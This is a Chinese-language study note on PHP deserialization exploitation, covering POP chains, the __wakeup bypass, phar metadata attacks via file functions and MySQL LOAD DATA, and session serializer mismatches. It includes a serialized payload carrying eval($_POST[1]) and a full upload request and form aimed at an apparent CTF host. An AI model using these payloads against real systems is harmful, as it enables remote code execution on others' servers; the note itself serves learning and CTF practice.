# php反序列化

## 入口点查找技巧

php_manual中找到的魔术方法：

```
__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 
```



正则：`__destruct|__wakeup()`



## pop链的构造

### 基础

通过替换类中的变量来执行相同函数名字带有敏感操作的函数

所以找反序列化洞的时候一般可以重点关注两个魔术方法：`__wakeup()`(反序列化的初始化调用),`__destruct()`

当然wakeup是可以绕过的，具体可以看看



### 技巧

1.找到反序列化点2.寻找可利用的魔术方法(如`__destruct()`,`__wakeup()`)3.寻找可利用魔术方法调用函数

绕过`__wakeup()`:`CVE-2016-7124`

获取已经包含的文件：
get_included_files()
获取已经定义的类：
get_declared_classes()
加载所有类
__autoload()

### php原生类反序列化

### phar

 https://blog.zsxsoft.com/post/38?from=timeline&isappinstalled=0 

https://paper.seebug.org/680/

#### 原理

部分文件操作函数用phar伪协议读取phar文件会反序列化phar文件中的meta-data 部分的序列化内容

#### phar文件结构

- a **stub**
  可以理解为一个标志，格式为`xxxxxxxxx; __HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。

- a **manifest** describing the contents
  phar文件本质上是一种压缩文件，其中每个被压缩文件的权限,属性等信息都放在这部分。这部分还会以**序列化**的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。

- the file **contents**
  被压缩文件的内容。

- [optional] a **signature** for verifying Phar integrity (phar file format only)

  签名，放在文件末尾

#### 影响

##### 影响函数

```php
fileatime|filectime|file_exists|file_get_contents|file_put_contents|file|filegroup|fopen|fileinode|filemtime|fileowner|fileperms|is_dir|is_executable|is_file|is_link|is_readable|is_writable|is_writeable|parse_ini_file|copy|unlink|stat|readfile|md5_file|filesize|mime_content_type|exif_thumbnail|exif_imagetype|imageloadfont|imagecreatefrom|hash_hmac_file|hash_file|hash_update_file|md5_file|sha1_file|get_meta_tagsget_headers|getimagesize|getimagesizefromstring|finfo_file|finfo_buffer|mime_content_type
```

```
fileatime / filectime / filemtimestat / fileinode / fileowner / filegroup / filepermsfile / file_get_contents / readfile / fopen / file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable / parse_ini_file / unlink / copy / include

exif_thumbnail / exif_imagetype / imageloadfont / imagecreatefrom
hash_hmac_file / hash_file / hash_update_file / md5_file / sha1_file

get_meta_tagsget_headers
getimagesize / getimagesizefromstring

finfo_file/finfo_buffer/mime_content_type
```



##### mysql load data

 php调用mysql的语句`LOAD DATA LOCAL INFILE`导入`phar`文件也能触发`phar`中的反序列化语句 

https://github.com/Gifts/Rogue-MySql-Server 

`LOAD DATA LOCAL INFILE 'phar://phar.phar/test.txt' into table user;`

```
local-infile=1
secure_file_priv=""
```



测试代码:



```php
<?php
    class TestObject{
        function __destruct(){
            echo $this->data;
        }
    }

    //include "php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt";

    $m = mysqli_init();
    mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
    $s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'ctf', 3306);
    $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://phar.phar/test.txt\' INTO TABLE user');

?>
```





#### phar文件生成demo

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar,phar伪协议不用phar后缀
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub,只要后面部分为__HALT_COMPILER(); ?>就行,开头可以随意
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```



### 绕过对phar文件内容的限制



`phar://phar.phar/test.txt`

`将phar文件压缩后便可以绕过文件限制`



## session的序列化引擎配置错误导致的命令执行

### 利用条件

1. php.ini中设置session.serialize_handler为php_serialize
2. 启动session
3. 某个网页的session.serialize_handler为php

### 原理

在php.ini中存在三项配置项：

```
session.save_path=""   --设置session的存储路径
session.save_handler="" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start   boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php
```

`session.serialize_handler`是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。

- php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
- php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
- php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值

我们这里主要关注php和php_serialize(php>5.5.4)

我们可以发现,如果我们存储用的引擎是php_serialize,而读取用的引擎是php时,我们可以构造如`$_SESSION['a']='|O:5:"OowoO":1:{s:4:"mdzz";s:16:"eval($_POST[1]);";}'`

,这个在文件中的存储为

```
a:1:{s:2:"en";s:43:"|O:5:"OowoO":1:{s:4:"mdzz";s:10:"phpinfo();";}
```

这样如果用php引擎解析的话,就不被理解成:键名为`a:1:{s:2:"en";s:43:"`，值为`O:5:"OowoO":1:{s:4:"mdzz";s:10:"phpinfo();";}`反序列化的结果,也就是一个对象

这样我们就成功的反序列化了

### 和它搭档的php配置



![image.png](https://i.loli.net/2019/10/11/8ajOXlMD9fybx6W.png)

> 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。



eg.

```
POST /phpinfo.php HTTP/1.1
Host: web.jarvisoj.com:32784
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------168279961491
Content-Length: 1067
DNT: 1
Connection: close
Referer: http://127.0.0.1/
Cookie: PHPSESSID=d0vqrh2ejn9el54i1en9cnev43
Upgrade-Insecure-Requests: 1

-----------------------------168279961491
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

123
-----------------------------168279961491
Content-Disposition: form-data; name="aaa"; filename='|O:5:"OowoO":1:{s:4:"mdzz";s:16:"eval($_POST[1]);";}'
Content-Type: text/html

aaaaaa
-----------------------------168279961491--
```

在本地测试发现filename和name 还有一些其他的会写入到session里

产生这种情况的html页面

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```



## php反序列化的一些特性

### 引用

```php
<?php
class test{
    public $var1="test";
    public $var2;
    public function __construct()
    {
        $this->var2=&$this->var1;
    }
}
$tmp=serialize(new test);
echo unserialize($tmp)->var2;
?>
result:test
```



### 序列化中不存在的变量,使用默认值

```php
<?php
class test{
    public $var1="test";
    public $var2;
    public function __construct()
    {
        //$this->var2=&$this->var1;
    }
}
$tmp='O:4:"test":1:{s:4:"var2";N;}';
echo unserialize($tmp)->var1;
?>

result:test
```

